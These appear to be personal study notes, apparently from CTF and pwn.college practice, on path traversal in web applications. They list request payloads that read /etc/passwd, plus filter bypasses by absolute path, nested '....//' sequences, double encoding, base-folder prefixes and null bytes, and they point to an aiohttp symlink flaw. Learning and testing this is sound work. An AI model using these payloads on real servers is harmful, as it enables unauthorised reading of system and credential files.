
how [[flask]] routes are defined.

path/directory traversal enables an attacker to read files.

## how to read files

if something like `<img src="/loadImage?filename=218.png">` in the code, the application
appends the filename to a base path (`var/www/images/`) and gets the file (`var/www/images/218.png`).

exploit: `GET /image?filename=../../../etc/passwd HTTP/2`

## bypass filters

understand how the filter functions:

* the `strip()` function in [[pwn.college_web_security#path traversal 2]]

* [getCanonicalName](getCanonicalName.java) checks for path traversal by looking
at the last slash character, depending whether it's windrows or Unix.

### possible solutions when traversal sequences are striped/blocked

1. use an absolute path.

   `GET /image?filename=/etc/passwd HTTP/2`

2. use Nested traversal sequences: `....//` or `....\/`, becomes the regular sequence if the
   inner is stripped.

   `GET /image?filename=....//....//....//etc/passwd HTTP/2`

3. encode, double encode, non-standard encoding my also work.

   `GET /image filename=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32 66etc/passwd HTTP/2`

4. if the application requires the filename to also include the base folder.

  vulnerable code: `<img src="/image?filename=/var/www/images/52.jpg">`
  exploit: `GET /image?filename=/var/www/images/../../../etc/passwd HTTP/2`

5. when application expects the extension

  use a null byte; `GET /image?filename=../../../etc/passwd%00.png HTTP/2`


* the way `aiohttp/3.9.1` handles static file serving attacker can leverage
symlinks to access files [this](76/README.md#CVE-2024-23334)